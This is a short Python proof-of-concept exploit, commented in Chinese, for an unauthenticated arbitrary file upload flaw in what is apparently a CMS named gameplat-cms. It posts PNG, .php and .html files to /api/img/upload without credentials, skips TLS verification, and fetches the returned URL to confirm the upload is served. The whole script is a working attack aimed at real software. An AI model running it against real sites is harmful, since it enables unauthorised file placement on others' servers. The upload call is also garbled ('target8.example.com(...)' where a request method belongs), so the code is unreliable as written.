#!/usr/bin/env python3
# 未授权任意文件上传 POC（gameplat-cms /api/img/upload）
# 用法: python poc_unauth_upload.py https://TARGET
import sys, requests, urllib3
urllib3.disable_warnings()
base = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'https://TARGET'
S = requests.Session(); S.verify = False
H = {'User-Agent': 'Mozilla/5.0 Chrome/126', 'x-request-source': base,
     'Origin': base, 'Referer': base + '/login'}
# 1) 无任何 Cookie/Token 直接上传
for fn, body, ct in [('t.png', b'\x89PNG\r\n\x1a\n', 'image/png'),
                     ('poc.php', b'<script>document.title=1</script>', 'text/html'),
                     ('poc.html', b'<h1>x</h1>', 'text/html')]:
    r = target8.example.com(base + '/api/img/upload', files={'file': (fn, body, ct)}, headers=H, timeout=25)
    print(fn, '->', r.status_code, r.text[:200])
    try:
        u = r.json().get('data')
    except Exception:
        u = None
    if u:
        v = requests.get(u, timeout=20, verify=False, headers={'User-Agent': 'Mozilla/5.0 Chrome/126'})
        print('   verify:', v.status_code, v.headers.get('content-type'), v.content[:80])
# 判据: code=0 且返回公网 URL、后缀与 Content-Type 均未校验 => 未授权任意文件上传
# 对照: /api/file/upload 同形态返回 401（说明是该接口单独缺鉴权）
